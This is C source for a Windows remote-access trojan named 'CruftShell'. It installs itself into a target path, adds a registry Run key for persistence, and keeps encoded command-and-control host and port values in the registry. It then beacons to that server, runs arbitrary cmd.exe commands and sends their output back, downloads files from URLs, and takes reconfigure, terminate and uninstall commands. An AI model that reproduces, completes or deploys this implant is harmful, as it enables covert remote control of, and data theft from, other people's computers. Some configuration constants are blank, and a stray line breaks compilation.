#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "tinyutils.h"

#pragma comment(lib, "ws2_32.lib")

#define max_command_length   1024
#define sleepTime            1000

#define encPort             ""
#define encHost             ""
#define encHostKey          ""
#define encPortKey          ""
#define encPersistenceData  ""
#define encConnInfoKey      ""
#define encPersistenceKey   "vriwzduh_plfurvriw_zlqgrzv_fxuuhqwyhuvlrq_uxq"
#define encPersistenceValue ""

#define comReconnect        ""
#define comUninstall        ""
#define comDownload         ""
#define comTerminate        ""
#define comResetPort        ""
#define comResetHost        ""

void ExecuteServerCommand(SOCKET sock, const char* command) {
    
    /*
        Execute a cmd.exe command on the host operating system
    */

    // Create a buffer for the commands output
    char bufCommandOutput[max_command_length] = { 0 };

    // Open a pipe to execute the command and read the output from stdout stream
    FILE* commandPipe = _popen(command, "r");

    // If data was returned from the pipe successfully,
    if (commandPipe) {

        // Read each line from the output stream into the buffer, send the output to the controller
        while (fgets(bufCommandOutput, sizeof(bufCommandOutput), commandPipe) != NULL) {
            send(sock, bufCommandOutput, sizeof(bufCommandOutput), 0);
        }
        // Close the pipe
        _pclose(commandPipe);    
    }

}

int main() {

    //Define server address and port variables
    const int bufAddr = 16;
    const int bufPort = 6;
    char serverAddress[16];
    char serverPort[6];
    int  intServerPort;
    
    // Create sockaddr_in data structure for network communications
    struct sockaddr_in SocketStructure;

    //Define windows socket data structure
    WSADATA WinSockData;

    // Create a pointer for the encoded persistence key data
    char* pEncodedTargetExeData = encPersistenceData;

    // Define a buffer to expand the evironment variables into 
    char pTargetExecutionData[MAX_PATH];

    // Define the standard registry path that will be used for writing conneciton info values to registry
    char* pConnectionInformationKey = encConnInfoKey;

    // Define the standard registry path for the run execute key
    char* pRegistryPersistenceKey = encPersistenceKey;

    // Define host and port value names
    char* pHostKeyValue = encHostKey;
    char* pPortKeyValue = encPortKey;

    // Define default host and port data
    char* pHostKeyData = encHost;
    char* pPortKeyData = encPort;

    // Define registry persistence key name
    char* pPersistenceKeyValue = encPersistenceValue;

    // Define a character array for retrieving the current path that the process is executing from. When
    // passed to GetModuleFileName, this array will decay into a pointer to the first item in the array 
    // which satisfies the LPSTR data type for lpFileName out parameter.
    char currentPathInMemory[MAX_PATH];

    printf("[BEGIN] CruftShell has begun execution!\n");
    printf("[INFO]  Acquiring current path of module\n");

    // Get the file path that the process is executing from, and write to buffer
    GetModuleFileNameA(0, currentPathInMemory, MAX_PATH);
    
    // Decode target execution path
    decodeCipher(pEncodedTargetExeData);

    // Expand the environment variables from the decoded string
    ExpandEnvironmentStrings(pEncodedTargetExeData, pTargetExecutionData, MAX_PATH);
    printf("[SUCCESS] Got path. Path is -> %s\n[INFO] Checking current path against target execution path -> %s\n", currentPathInMemory, pTargetExecutionData);
    
    // Compare the current exe path in the buffer to the target path
    if (strcmp(pTargetExecutionData, currentPathInMemory) != 0) {
        runInfectionCycle(pConnectionInformationKey,
                          pRegistryPersistenceKey,
                          pHostKeyValue,
                          pPortKeyValue,
                          pPersistenceKeyValue,
                          pHostKeyData,
                          pPortKeyData,
                          currentPathInMemory,
                          (char*)pTargetExecutionData);
    }
    // System is already infected. Continue to connecting to controller. 
    else {
        printf("[HOST ALREADY INFECTED] Module is running from same path as persistence value.\n");
    }
    
    // Re-encode the target execution path
    encodeCipher(pTargetExecutionData);

    printf("[INFO] Beginning beacon operations\n"); 

    // Initiate use of winsock dll for socket operations
    WSAStartup(0x0202, &WinSockData);

// Create label for returning to connection
connect:
    
    // Decode info, host, port keys
    decodeCipher(pConnectionInformationKey);
    decodeCipher(pHostKeyValue);
    decodeCipher(pPortKeyValue);

    // Get encoded host and port values from registry, write to buffers
    RegGetValueA(HKEY_CURRENT_USER, pConnectionInformationKey, pHostKeyValue, RRF_RT_REG_SZ, 0, &serverAddress, &bufAddr);
    RegGetValueA(HKEY_CURRENT_USER, pConnectionInformationKey, pPortKeyValue, RRF_RT_REG_SZ, 0, &serverPort, &bufPort);

    // Decode data in buffers for host and port values
    decodeCipher(serverAddress);
    decodeCipher(serverPort);

    // Set server port to int value
    intServerPort = atoi(serverPort);

    printf("[SUCCESS] Retrieved cnc server information\n[INFO] Server Address: %s\n[INFO] Server Port: %s\n", serverAddress, serverPort);

    // Add Protocol family, IP and port to socket structure
    SocketStructure.sin_family      = AF_INET;
    SocketStructure.sin_port        = htons(intServerPort);
    SocketStructure.sin_addr.s_addr = inet_addr(serverAddress);
    
    // encode the connection variables
    encodeCipher(serverAddress);
    encodeCipher(serverPort);
    encodeCipher(pConnectionInformationKey);
    encodeCipher(pHostKeyValue);
    encodeCipher(pPortKeyValue);

    // Create an unconnected socket 
    SOCKET clientSocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    
    // Begin an infinite beacon loop. Loop breaks on successful connection
    printf("[BEGIN] Entering server connection loop\n");
    while (connect(clientSocket, (struct sockaddr*)&SocketStructure, sizeof(SocketStructure)) != 0) {
        printf("[Fail] Failed to connect to server\n");
        Sleep(sleepTime);
    }

    // Create buffer for getting command string from controller and length of the command
    char serverCommand[max_command_length];
    int  serverCommandLength;

    // Start communication loop with controller. Loop breaks on socket disconnection
    while (1) {

        // Get command from client and write data to the buffer
        serverCommandLength = recv(clientSocket, serverCommand, sizeof(serverCommand) - 1, 0);
        
        // If the size of the data received from the server is less than or equal to 0, this indicates
        // a graceful connection close. Go to reconnect funciton. 
        if (serverCommandLength <= 0) {
            goto connect;
        }

        // Add null terminator to string
        serverCommand[serverCommandLength] = '\0';

        printf("[CONTROLLER] Got data from controller: %s\n", serverCommand);
        
        // Check for commands from the server that relate to functions to exeucte. Grab the first 10
        // characters from the server command since this represents code for the agent to perform
        char commandCode[11];
        strncpy(commandCode, serverCommand, 10);
        commandCode[10] = '\0';
.
        // Remove all registry values
        if (strcmp((const char*)commandCode, comUninstall) == 0) {
            doUninstallation(pConnectionInformationKey,
                             pRegistryPersistenceKey,
                             pHostKeyValue,
                             pPortKeyValue,
                             pPersistenceKeyValue,
                             currentPathInMemory);
        }
        // Reconnect to server
        else if (strcmp((const char*)commandCode, comReconnect) == 0) {
            goto connect;
        }
        // Change host registry key data
        else if (strcmp((const char*)commandCode, comResetHost) == 0) {
            doNetworkInfoChange(pConnectionInformationKey, pHostKeyValue, serverCommand);
        }
        // Change port registry key data
        else if (strcmp((const char*)commandCode, comResetPort) == 0) {
            doNetworkInfoChange(pConnectionInformationKey, pPortKeyValue, serverCommand);
        }
        // Download file from URL
        else if (strcmp((const char*)commandCode, comDownload) == 0) {
            doUrlDownload(serverCommand);
        }
        // Kill the process
        else if (strcmp((const char*)commandCode, comTerminate) == 0) {
            printf("[SUCCESS] Received exit call from controller. Exiting process.");
            
            // Close the socket;
            closesocket(clientSocket);
            
            // Call winsock library cleanup
            WSACleanup();

            // Exit the process
            ExitProcess(0);
        }
        // Execute system command if command was not found. Default.
        else {
            ExecuteServerCommand(clientSocket, serverCommand);
        }

    }
    WSACleanup();
    return 0;
} 